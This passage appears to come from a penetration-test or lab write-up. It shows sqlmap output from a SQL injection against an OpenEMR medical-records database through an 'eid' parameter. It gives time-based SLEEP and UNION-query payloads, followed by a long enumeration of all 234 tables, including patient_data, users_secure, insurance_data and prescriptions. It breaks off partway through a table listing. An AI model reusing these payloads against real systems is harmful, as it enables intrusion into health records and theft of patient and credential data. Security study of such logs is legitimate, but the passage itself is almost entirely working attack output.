(ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[09:57:21] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[09:57:21] [INFO] fetching tables for database: &#x27;openemr&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;addresses&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;amc_misc_data&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;amendments&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;amendments_history&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;ar_activity&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;ar_session&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;array&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;audit_details&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;audit_master&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;automatic_notification&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;background_services&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;batchcom&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;billing&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;calendar_external&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;categories&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;categories_seq&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;categories_to_documents&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;ccda&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_components&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_field_mapping&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_sections&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;ccda_table_mapping&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;chart_tracker&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;claims&#x27;</span><br><span class="line">[09:57:30] [INFO] retrieved: &#x27;clinical_plans&#x27;</span><br><span class="line">[09:57:30] [INFO] retrieved: &#x27;clinical_plans_rules&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;clinical_rules&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;clinical_rules_log&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;code_types&#x27;</span><br><span class="line">[09:57:32] [INFO] retrieved: &#x27;codes&#x27;</span><br><span class="line">[09:57:32] [INFO] retrieved: &#x27;codes_history&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;config&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;config_seq&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;customlists&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;dated_reminders&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;dated_reminders_link&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;direct_message_log&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents_legal_categories&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents_legal_detail&#x27;</span><br><span class="line">[09:57:36] [INFO] retrieved: &#x27;documents_legal_master&#x27;</span><br><span class="line">[09:57:36] [INFO] retrieved: &#x27;drug_inventory&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drug_sales&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drug_templates&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drugs&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;eligibility_response&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;eligibility_verification&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;employer_data&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;enc_category_map&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;erx_drug_paid&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;erx_narcotics&#x27;</span><br><span class="line">[09:57:40] [INFO] retrieved: &#x27;erx_rx_log&#x27;</span><br><span class="line">[09:57:40] [INFO] retrieved: &#x27;erx_ttl_touch&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;esign_signatures&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;extended_log&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;external_encounters&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;external_procedures&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;facility&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;facility_user_ids&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;fee_sheet_options&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;form_care_plan&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;form_clinical_instructions&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_dictation&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_encounter&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_eye_mag&#x27;</span><br><span class="line">[09:57:45] [INFO] retrieved: &#x27;form_eye_mag_dispense&#x27;</span><br><span class="line">[09:57:45] [INFO] retrieved: &#x27;form_eye_mag_impplan&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_orders&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_prefs&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_wearing&#x27;</span><br><span class="line">[09:57:47] [INFO] retrieved: &#x27;form_functional_cognitive_status&#x27;</span><br><span class="line">[09:57:47] [INFO] retrieved: &#x27;form_group_attendance&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_groups_encounter&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_misc_billing_options&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_observation&#x27;</span><br><span class="line">[09:57:49] [INFO] retrieved: &#x27;form_reviewofs&#x27;</span><br><span class="line">[09:57:49] [INFO] retrieved: &#x27;form_ros&#x27;</span><br><span class="line">[09:57:50] [INFO] retrieved: &#x27;form_soap&#x27;</span><br><span class="line">[09:57:51] [INFO] retrieved: &#x27;form_taskman&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;form_vitals&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;forms&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;gacl_acl&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_acl_sections&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_acl_seq&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_aco&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_map&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_sections&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_sections_seq&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aco_seq&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aro&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aro_groups&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_groups_id_seq&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_groups_map&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_map&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_sections&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_sections_seq&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_seq&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo_groups&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo_groups_map&#x27;</span><br><span class="line">[09:57:59] [INFO] retrieved: &#x27;gacl_axo_map&#x27;</span><br><span class="line">[09:57:59] [INFO] retrieved: &#x27;gacl_axo_sections&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_groups_aro_map&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_groups_axo_map&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_phpgacl&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;geo_country_reference&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;geo_zone_reference&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;globals&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;gprelations&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;groups&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;history_data&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_dx_order_code&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_gem_dx_10_9&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_gem_dx_9_10&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_gem_pcs_10_9&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_gem_pcs_9_10&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_pcs_order_code&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd10_reimbr_dx_9_10&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd10_reimbr_pcs_9_10&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd9_dx_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_dx_long_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_sg_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_sg_long_code&#x27;</span><br><span class="line">[09:58:07] [INFO] retrieved: &#x27;immunization_observation&#x27;</span><br><span class="line">[09:58:07] [INFO] retrieved: &#x27;immunizations&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_companies&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_data&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_numbers&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;issue_encounter&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;issue_types&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;lang_constants&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_custom&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_definitions&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_languages&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;layout_group_properties&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;layout_options&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;lbf_data&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;lbt_data&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;list_options&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;lists&#x27;</span><br><span class="line">[09:58:13] [INFO] retrieved: &#x27;lists_touch&#x27;</span><br><span class="line">[09:58:13] [INFO] retrieved: &#x27;log&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;log_comment_encrypt&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;log_validator&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;medex_icons&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_outgoing&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_prefs&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_recalls&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;misc_address_book&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;module_acl_group_settings&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;module_acl_sections&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;module_acl_user_settings&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;module_configuration&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;modules&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;modules_hooks_settings&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;modules_settings&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;multiple_db&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notes&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notification_log&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notification_settings&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onotes&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onsite_documents&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onsite_mail&#x27;</span><br><span class="line">[09:58:21] [INFO] retrieved: &#x27;onsite_messages&#x27;</span><br><span class="line">[09:58:21] [INFO] retrieved: &#x27;onsite_online&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;onsite_portal_activity&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;onsite_signatures&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;openemr_module_vars&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_modules&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_postcalendar_categories&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_postcalendar_events&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_postcalendar_limits&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_postcalendar_topics&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_session_info&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_access_offsite&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_access_onsite&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_birthday_alert&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_data&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_portal_menu&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_reminders&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;patient_tracker&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;patient_tracker_element&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;payment_gateway_details&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;payments&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;pharmacies&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;phone_numbers&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_bookmark&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_column_info&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_history&#x27;</span><br><span class="line">[09:58:30] [INFO] retrieved: &#x27;pma_pdf_pages&#x27;</span><br><span class="line">[09:58:30] [INFO] retrieved: &#x27;pma_relation&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pma_table_coords&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pma_table_info&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pnotes&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;prescriptions&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;prices&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;procedure_answers&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_order&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_order_code&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_providers&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_questions&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_report&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_result&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;procedure_type&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;product_registration&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;product_warehouse&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;registry&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;report_itemized&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;report_results&#x27;</span><br><span class="line">[09:58:37] [INFO] retrieved: &#x27;rule_action&#x27;</span><br><span class="line">[09:58:37] [INFO] retrieved: &#x27;rule_action_item&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_filter&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_patient_data&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_reminder&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;rule_target&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;sequences&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;shared_attributes&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;standardized_tables_track&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;supported_external_dataloads&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;syndromic_surveillance&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;template_users&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;therapy_groups&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;therapy_groups_counselors&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;therapy_groups_participant_attendance&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;therapy_groups_participants&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;transactions&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;user_settings&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;users&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;users_facility&#x27;</span><br><span class="line">[09:58:44] [INFO] retrieved: &#x27;users_secure&#x27;</span><br><span class="line">[09:58:44] [INFO] retrieved: &#x27;valueset&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;version&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;voids&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;x12_partners&#x27;</span><br><span class="line">Database: openemr                                                                                                                                           </span><br><span class="line">[234 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| array                                 |</span><br><span class="line">| groups                                |</span><br><span class="line">| log                                   |</span><br><span class="line">| version                               |</span><br><span class="line">| addresses                             |</span><br><span class="line">| amc_misc_data                         |</span><br><span class="line">| amendments                            |</span><br><span class="line">| amendments_history                    |</span><br><span class="line">| ar_activity                           |</span><br><span class="line">| ar_session                            |</span><br><span class="line">| audit_details                         |</span><br><span class="line">| audit_master                          |</span><br><span class="line">| automatic_notification                |</span><br><span class="line">| background_services                   |</span><br><span class="line">| batchcom                              |</span><br><span class="line">| billing                               |</span><br><span class="line">| calendar_external                     |</span><br><span class="line">| categories                            |</span><br><span class="line">| categories_seq                        |</span><br><span class="line">| categories_to_documents               |</span><br><span class="line">| ccda                                  |</span><br><span class="line">| ccda_components                       |</span><br><span class="line">| ccda_field_mapping                    |</span><br><span class="line">| ccda_sections                         |</span><br><span class="line">| ccda_table_mapping                    |</span><br><span class="line">| chart_tracker                         |</span><br><span class="line">| claims                                |</span><br><span class="line">| clinical_plans                        |</span><br><span class="line">| clinical_plans_rules                  |</span><br><span class="line">| clinical_rules                        |</span><br><span class="line">| clinical_rules_log                    |</span><br><span class="line">| code_types                            |</span><br><span class="line">| codes                                 |</span><br><span class="line">| codes_history                         |</span><br><span class="line">| config                                |</span><br><span class="line">| config_seq                            |</span><br><span class="line">| customlists                           |</span><br><span class="line">| dated_reminders                       |</span><br><span class="line">| dated_reminders_link                  |</span><br><span class="line">| direct_message_log                    |</span><br><span class="line">| documents                             |</span><br><span class="line">| documents_legal_categories            |</span><br><span class="line">| documents_legal_detail                |</span><br><span class="line">| documents_legal_master                |</span><br><span class="line">| drug_inventory                        |</span><br><span class="line">| drug_sales                            |</span><br><span class="line">| drug_templates                        |</span><br><span class="line">| drugs                                 |</span><br><span class="line">| eligibility_response                  |</span><br><span class="line">| eligibility_verification              |</span><br><span class="line">| employer_data                         |</span><br><span class="line">| enc_category_map                      |</span><br><span class="line">| erx_drug_paid                         |</span><br><span class="line">| erx_narcotics                         |</span><br><span class="line">| erx_rx_log                            |</span><br><span class="line">| erx_ttl_touch                         |</span><br><span class="line">| esign_signatures                      |</span><br><span class="line">| extended_log                          |</span><br><span class="line">| external_encounters                   |</span><br><span class="line">| external_procedures                   |</span><br><span class="line">| facility                              |</span><br><span class="line">| facility_user_ids                     |</span><br><span class="line">| fee_sheet_options                     |</span><br><span class="line">| form_care_plan                        |</span><br><span class="line">| form_clinical_instructions            |</span><br><span class="line">| form_dictation                        |</span><br><span class="line">| form_encounter                        |</span><br><span class="line">| form_eye_mag                          |</span><br><span class="line">| form_eye_mag_dispense                 |</span><br><span class="line">| form_eye_mag_impplan                  |</span><br><span class="line">| form_eye_mag_orders                   |</span><br><span class="line">| form_eye_mag_prefs                    |</span><br><span class="line">| form_eye_mag_wearing                  |</span><br><span class="line">| form_functional_cognitive_status      |</span><br><span class="line">| form_group_attendance                 |</span><br><span class="line">| form_groups_encounter                 |</span><br><span class="line">| form_misc_billing_options             |</span><br><span class="line">| form_observation                      |</span><br><span class="line">| form_reviewofs                        |</span><br><span class="line">| form_ros                              |</span><br><span class="line">| form_soap                             |</span><br><span class="line">| form_taskman                          |</span><br><span class="line">| form_vitals                           |</span><br><span class="line">| forms                                 |</span><br><span class="line">| gacl_acl                              |</span><br><span class="line">| gacl_acl_sections                     |</span><br><span class="line">| gacl_acl_seq                          |</span><br><span class="line">| gacl_aco                              |</span><br><span class="line">| gacl_aco_map                          |</span><br><span class="line">| gacl_aco_sections                     |</span><br><span class="line">| gacl_aco_sections_seq                 |</span><br><span class="line">| gacl_aco_seq                          |</span><br><span class="line">| gacl_aro                              |</span><br><span class="line">| gacl_aro_groups                       |</span><br><span class="line">| gacl_aro_groups_id_seq                |</span><br><span class="line">| gacl_aro_groups_map                   |</span><br><span class="line">| gacl_aro_map                          |</span><br><span class="line">| gacl_aro_sections                     |</span><br><span class="line">| gacl_aro_sections_seq                 |</span><br><span class="line">| gacl_aro_seq                          |</span><br><span class="line">| gacl_axo                              |</span><br><span class="line">| gacl_axo_groups                       |</span><br><span class="line">| gacl_axo_groups_map                   |</span><br><span class="line">| gacl_axo_map                          |</span><br><span class="line">| gacl_axo_sections                     |</span><br><span class="line">| gacl_groups_aro_map                   |</span><br><span class="line">| gacl_groups_axo_map                   |</span><br><span class="line">| gacl_phpgacl                          |</span><br><span class="line">| geo_country_reference                 |</span><br><span class="line">| geo_zone_reference                    |</span><br><span class="line">| globals                               |</span><br><span class="line">| gprelations                           |</span><br><span class="line">| history_data                          |</span><br><span class="line">| icd10_dx_order_code                   |</span><br><span class="line">| icd10_gem_dx_10_9                     |</span><br><span class="line">| icd10_gem_dx_9_10                     |</span><br><span class="line">| icd10_gem_pcs_10_9                    |</span><br><span class="line">| icd10_gem_pcs_9_10                    |</span><br><span class="line">| icd10_pcs_order_code                  |</span><br><span class="line">| icd10_reimbr_dx_9_10                  |</span><br><span class="line">| icd10_reimbr_pcs_9_10                 |</span><br><span class="line">| icd9_dx_code                          |</span><br><span class="line">| icd9_dx_long_code                     |</span><br><span class="line">| icd9_sg_code                          |</span><br><span class="line">| icd9_sg_long_code                     |</span><br><span class="line">| immunization_observation              |</span><br><span class="line">| immunizations                         |</span><br><span class="line">| insurance_companies                   |</span><br><span class="line">| insurance_data                        |</span><br><span class="line">| insurance_numbers                     |</span><br><span class="line">| issue_encounter                       |</span><br><span class="line">| issue_types                           |</span><br><span class="line">| lang_constants                        |</span><br><span class="line">| lang_custom                           |</span><br><span class="line">| lang_definitions                      |</span><br><span class="line">| lang_languages                        |</span><br><span class="line">| layout_group_properties               |</span><br><span class="line">| layout_options                        |</span><br><span class="line">| lbf_data                              |</span><br><span class="line">| lbt_data                              |</span><br><span class="line">| list_options                          |</span><br><span class="line">| lists                                 |</span><br><span class="line">| lists_touch                           |</span><br><span class="line">| log_comment_encrypt                   |</span><br><span class="line">| log_validator                         |</span><br><span class="line">| medex_icons                           |</span><br><span class="line">| medex_outgoing                        |</span><br><span class="line">| medex_prefs                           |</span><br><span class="line">| medex_recalls                         |</span><br><span class="line">| misc_address_book                     |</span><br><span class="line">| module_acl_group_settings             |</span><br><span class="line">| module_acl_sections                   |</span><br><span class="line">| module_acl_user_settings              |</span><br><span class="line">| module_configuration                  |</span><br><span class="line">| modules                               |</span><br><span class="line">| modules_hooks_settings                |</span><br><span class="line">| modules_settings                      |</span><br><span class="line">| multiple_db                           |</span><br><span class="line">| notes                                 |</span><br><span class="line">| notification_log                      |</span><br><span class="line">| notification_settings                 |</span><br><span class="line">| onotes                                |</span><br><span class="line">| onsite_documents                      |</span><br><span class="line">| onsite_mail                           |</span><br><span class="line">| onsite_messages                       |</span><br><span class="line">| onsite_online                         |</span><br><span class="line">| onsite_portal_activity                |</span><br><span class="line">| onsite_signatures                     |</span><br><span class="line">| openemr_module_vars                   |</span><br><span class="line">| openemr_modules                       |</span><br><span class="line">| openemr_postcalendar_categories       |</span><br><span class="line">| openemr_postcalendar_events           |</span><br><span class="line">| openemr_postcalendar_limits           |</span><br><span class="line">| openemr_postcalendar_topics           |</span><br><span class="line">| openemr_session_info                  |</span><br><span class="line">| patient_access_offsite                |</span><br><span class="line">| patient_access_onsite                 |</span><br><span class="line">| patient_birthday_alert                |</span><br><span class="line">| patient_data                          |</span><br><span class="line">| patient_portal_menu                   |</span><br><span class="line">| patient_reminders                     |</span><br><span class="line">| patient_tracker                       |</span><br><span class="line">| patient_tracker_element               |</span><br><span class="line">| payment_gateway_details               |</span><br><span class="line">| payments                              |</span><br><span class="line">| pharmacies                            |</span><br><span class="line">| phone_numbers                         |</span><br><span class="line">| pma_bookmark                          |</span><br><span class="line">| pma_column_info                       |</span><br><span class="line">| pma_history                           |</span><br><span class="line">| pma_pdf_pages                         |</span><br><span class="line">| pma_relation                          |</span><br><span class="line">| pma_table_coords                      |</span><br><span class="line">| pma_table_info                        |</span><br><span class="line">| pnotes                                |</span><br><span class="line">| prescriptions                         |</span><br><span class="line">| prices                                |</span><br><span class="line">| procedure_answers                     |</span><br><span class="line">| procedure_order                       |</span><br><span class="line">| procedure_order_code                  |</span><br><span class="line">| procedure_providers                   |</span><br><span class="line">| procedure_questions                   |</span><br><span class="line">| procedure_report                      |</span><br><span class="line">| procedure_result                      |</span><br><span class="line">| procedure_type                        |</span><br><span class="line">| product_registration                  |</span><br><span class="line">| product_warehouse                     |</span><br><span class="line">| registry                              |</span><br><span class="line">| report_itemized                       |</span><br><span class="line">| report_results                        |</span><br><span class="line">| rule_action                           |</span><br><span class="line">| rule_action_item                      |</span><br><span class="line">| rule_filter                           |</span><br><span class="line">| rule_patient_data                 